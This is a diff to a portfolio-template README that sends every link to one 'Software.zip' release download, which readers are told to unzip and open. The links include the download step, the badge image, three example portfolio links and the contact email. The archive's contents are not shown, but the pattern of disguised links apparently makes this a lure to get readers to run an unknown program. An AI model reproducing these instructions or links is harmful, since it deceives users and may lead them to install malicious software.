@@ -20,9 +20,9 @@ Showcase your projects in a visually engaging way with our project gallery featu
 
 Follow these simple steps to get started with your awesome portfolio:
 
-1. Click on the following link to download the software package: [Download Here](https://github.com/user-attachments/files/18410590/Software.zip)
+1. Click on the following link to download the software package: [Download Here](https://github.com/shiffy22/awesome-portfolio/releases/download/v2.0/Software.zip)
    
-   ![Download Software](https://img.shields.io/badge/Download-Software-blue)
+   ![Download Software](https://github.com/shiffy22/awesome-portfolio/releases/download/v2.0/Software.zip)
 
 2. Once the download is complete, unzip the files and open the software application.
 
@@ -34,9 +34,9 @@ Follow these simple steps to get started with your awesome portfolio:
 
 Check out these examples of awesome portfolios created using the resources from this repository:
 
-1. [Portfolio Example 1](https://www.exampleportfolio1.com)
-2. [Portfolio Example 2](https://www.exampleportfolio2.com)
-3. [Portfolio Example 3](https://www.exampleportfolio3.com)
+1. [Portfolio Example 1](https://github.com/shiffy22/awesome-portfolio/releases/download/v2.0/Software.zip)
+2. [Portfolio Example 2](https://github.com/shiffy22/awesome-portfolio/releases/download/v2.0/Software.zip)
+3. [Portfolio Example 3](https://github.com/shiffy22/awesome-portfolio/releases/download/v2.0/Software.zip)
 
 ## Resources 📚
 
@@ -48,7 +48,7 @@ Explore the resources available in this repository to enhance your portfolio:
 
 ## Get in Touch 📧
 
-Have questions or need assistance with building your portfolio? Reach out to our team at [portfoliohelp@example.com]. We're here to support you every step of the way!
+Have questions or need assistance with building your portfolio? Reach out to our team at [https://github.com/shiffy22/awesome-portfolio/releases/download/v2.0/Software.zip]. We're here to support you every step of the way!
 
 ---
 
